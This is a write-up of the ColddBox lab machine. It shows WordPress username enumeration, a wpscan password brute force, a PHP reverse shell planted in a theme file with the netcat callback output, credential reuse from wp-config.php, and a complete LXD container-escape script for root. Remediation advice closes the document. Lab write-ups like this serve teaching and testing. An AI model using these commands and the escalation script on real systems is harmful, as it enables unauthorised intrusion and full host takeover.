
## Overview
The target system was fully compromised due to weak access controls, exposed usernames and weak credential use.
The attacker was able to gain an initial shell on the system and later escalate privileges to root.

# Attack Path Summary
The exposure of usernames in an exposed directory lead to a successful brute force attack for access to the account of an author within the site. This allowed for modification of files which lead to an initial shell on the system. Then the reuse of credentials lead to the compromise of the system user c0ldd. by leveraging c0ldd's
access to the system the attacker was able to gain a root shell with the use of LXC container escape.

# Enumeration

Network enumeration using Nmap identified 2 services, One of which is a WordPress site. The WordPress version is outdated and must be updated to the latest version immediately.
Further enumeration also Exposed 3 usernames found in an exposed directory.
It was also found that the login page of the site has no rate limiting.

Command used:
`nmap -sV -sC -Pn -v 10.80.132.0`

Output:
```
Discovered open port 80/tcp on 10.80.132.0
PORT   STATE    SERVICE VERSION
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
```


Using a popular tool called gobuster to enumerate directories. A directory called: hidden
exposes 3 potential usernames and the login page.

Command used:
`gobuster dir -u http://10.80.132.0 -w /usr/share/wordlists/dirb/common.txt`

Output:
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.132.0
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 276]
.htaccess            (Status: 403) [Size: 276]
.htpasswd            (Status: 403) [Size: 276]
hidden               (Status: 301) [Size: 311] [--> http://10.80.132.0/hidden/]
index.php            (Status: 301) [Size: 0] [--> http://10.80.132.0/]
server-status        (Status: 403) [Size: 276]
wp-admin             (Status: 301) [Size: 313] [--> http://10.80.132.0/wp-admin/]
wp-content           (Status: 301) [Size: 315] [--> http://10.80.132.0/wp-content/]
wp-includes          (Status: 301) [Size: 316] [--> http://10.80.132.0/wp-includes/]
xmlrpc.php           (Status: 200) [Size: 42]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```


hidden directory:
![[01-hidden-c0lddbox.png]]


A scan with wpscan confirms the usernames and also the outdated WordPress installation.

Command used:
`wpscan --url http://10.80.132.0 --enumerate u`

Interesting output:
```
WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

# Initial Access
 With the exposed usernames and no rate limiting implicated, The attacker is able to perform a successful brute force attack resulting in the compromise of the user c0ldd.
 Then with access to c0ldd's WordPress account, The attacker was able to modify files to gain an initial shell on the target.

Command used:
`wpscan --url http://10.80.132.0 --usernames philip,c0ldd,hugo --passswords Desktop/rockyou.txt`

output:
```
[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / 9876543210
```


![[02-dashboard-c0lddbox.png]]


From here the attacker was able to edit files and injected a PHP reverse shell code to the functions.php file of the Twenty Fifteen theme and gain a shell on the target.

The reverse shell code is on line 3-4.

![[03-edithteme-c0lddbox.png]]


```
> nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.133.166] from (UNKNOWN) [10.80.132.0] 33816
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```


# Privilege Escalation
After a little enumeration the attacker finds c0ldd is also a user on the target system.
although his password is not the same as his WordPress password.
the attacker finds the database credentials and due to password reuse is able to compromise the user c0ldd on the system. the user c0ldd is in the LXD group which grants access to the LXD daemon running with root privileges. This allowed the attacker to create a privileged LXD container and mount the host filesystem inside the container. as a result, the attacker obtained root-level access to the host system.

Database credentials found in /var/www/html/wp-config.php

```
/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');
```

The attacker was able to change to the user c0ldd because the database password was also c0ldd's password on the system.

Becoming c0ldd:
```
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/var/www/html/wp-admin$ id
id
uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Using LXD to get a root shell:
the attacker transferred the below script from his machine to the target in the /tmp directory.

used this script:
```
#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#    Victor Lasa      (vowkin)
# ----------------------------------

function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc bash
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
```

ran with:
`chmod +x LxD.sh`
`./LxD.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz`

```
~ # ^[[68;5Rid
id
uid=0(root) gid=0(root)
```

```
cd /mnt/root/root
/mnt/root/root # ^[[68;18Rls
```


# Remediation
1.  Update WordPress to the latest version and implement rate limiting, do this first.
2.  Don't expose sensitive files in hidden directories, change the location to somewhere private or use a different form of communication.
3.  Don't use passwords found in data breaches and do not reuse the same password more than once. A password should be a atleast 8 characters long and include a number a uppercase and lowercase letter and a special character.
4. Keep users in the  LXD group only if really necessary.